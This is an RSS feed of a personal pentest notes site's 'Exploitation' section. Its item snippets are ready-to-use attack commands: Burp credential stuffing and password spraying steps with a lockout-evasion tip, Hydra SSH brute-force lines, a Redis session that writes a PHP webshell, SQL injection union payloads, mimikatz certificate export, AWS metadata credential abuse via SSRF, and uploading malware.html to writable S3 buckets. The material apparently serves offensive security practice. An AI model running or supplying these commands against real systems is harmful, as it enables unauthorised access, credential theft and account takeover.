<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>03. Exploitation on My notes and snippets</title>
    <link>https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/</link>
    <description>Recent content in 03. Exploitation on My notes and snippets</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 10 Mar 2020 16:33:38 +0100</lastBuildDate>
    
	<atom:link href="https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Credential Stuffing</title>
      <link>https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/password-attacks/credential-stuffing/</link>
      <pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate>
      
      <guid>https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/password-attacks/credential-stuffing/</guid>
      <description>Credential Stuffing Web with Burp Website login POST -&amp;gt; intruder -&amp;gt; clear $ -&amp;gt; Highlight user/password params -&amp;gt; Attacktype Pitchfork -&amp;gt; payload 1, user list -&amp;gt; payload 2, pass list -&amp;gt; run</description>
    </item>
    
    <item>
      <title>Hydra</title>
      <link>https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/password-attacks/brute-force/</link>
      <pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate>
      
      <guid>https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/password-attacks/brute-force/</guid>
      <description>Hydra known username, password list root with passwordlist, null password, login as pass and reversed login as pass.
hydra -v -V -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.88.129 ssh -t 8 -e nsr  user list, password list userlist with passwordlist, null password, login as pass and reversed login as pass looped around users.
hydra -v -V -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.88.129 ssh -t 8 -e nsr -u  </description>
    </item>
    
    <item>
      <title>Password Spraying</title>
      <link>https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/password-attacks/password-spraying/</link>
      <pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate>
      
      <guid>https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/password-attacks/password-spraying/</guid>
      <description>Password Spraying Microsoft Online https://github.com/justin-p/MSOLSpray
Watch out for AzureAD Smart lockout. Use fireprox and/or the delay param.
Web with Burp Website login POST -&amp;gt; intruder -&amp;gt; clear $ -&amp;gt; Highlight user param -&amp;gt; set password -&amp;gt; Attacktype Sniper -&amp;gt; payload 1, user list -&amp;gt; run</description>
    </item>
    
    <item>
      <title>Redis</title>
      <link>https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/redis/</link>
      <pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate>
      
      <guid>https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/redis/</guid>
      <description>Redis Webshell You must know the path of the Web site folder:
root@machine:~# redis-cli -h 10.10.10.10 10.85.0.52:6379&amp;gt; config set dir /usr/share/nginx/html OK 10.85.0.52:6379&amp;gt; config set dbfilename redis.php OK 10.85.0.52:6379&amp;gt; set test &amp;quot;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;quot; OK 10.85.0.52:6379&amp;gt; save OK  SSH  Generate a ssh public-private key pair on your pc: ssh-keygen -t rsa Write the public key to a file : (echo -e &amp;ldquo;\n\n&amp;rdquo;; cat ./.ssh/id_rsa.pub; echo -e &amp;ldquo;\n\n&amp;rdquo;) &amp;gt; foo.</description>
    </item>
    
    <item>
      <title>SQL Injection</title>
      <link>https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/sql-injection/</link>
      <pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate>
      
      <guid>https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/sql-injection/</guid>
      <description>sql injection External stuff exploit-db ASCII table
Always True 1=1 a=a
Escape/stop mysql # -- #--  MySQL Verison select version()
information Schema Table names SELECT table_schema,table_name FROM information_Schema.tables SELECT CONCAT(table_schema,table_name) FROM information_Schema.tables SELECT CONCAT(table_schema,char(58),table_name) FROM information_Schema.tables  Injection example 1 &#39; union (select CONCAT(table_schema,char(58),table_name) from information_Schema.tables where 1=1 ORDER BY table_name LIMIT 0,1) #--  dummymalex:dummyms table_schema = dummymalex table_name = dummyms  Hide stuff we dont need AND table_schema !</description>
    </item>
    
    <item>
      <title>Web Servers</title>
      <link>https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/web-servers/</link>
      <pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate>
      
      <guid>https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/web-servers/</guid>
      <description>Web Servers Azure Use mimikatz to extract certificated and try to authenticitate to Azure with them Mimikatz
crypto::capi privilege::debug crypto::cng crypto::certificates /systemstore:local_machine/store:my /export  AWS Instance Metadata Cloud server hosted on services like EC2 need a way to orient themselfs. Therefore a metadata endpoint was created that runs at 169.254.169.254. This can contain access/secrets keys to AWS and IAM credentials.
This should be reachable from localhost, can be abused after server compromise or SSRF.</description>
    </item>
    
    <item>
      <title>s3 bucket fun</title>
      <link>https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/s3-bucket-fun/</link>
      <pubDate>Tue, 10 Mar 2020 16:43:44 +0100</pubDate>
      
      <guid>https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/s3-bucket-fun/</guid>
      <description>s3 bucket fun Setup the AWS CLI with a user that has AmazonS3FullAccess permission AWS Access keys.
Run cloud_enum
python3 cloud_enum.py -k &amp;lt;OrgName&amp;gt;  If it returns a bucket you can list/download the contents with the AWS CLI
aws s3 ls s3://bucketname  If you can write you can add content to the bucket with the AWS CLI
aws s3 mv malware.html s3://bucketname/malware.html  Domain Hijacking If you see a 404 to *.</description>
    </item>
    
  </channel>
</rss>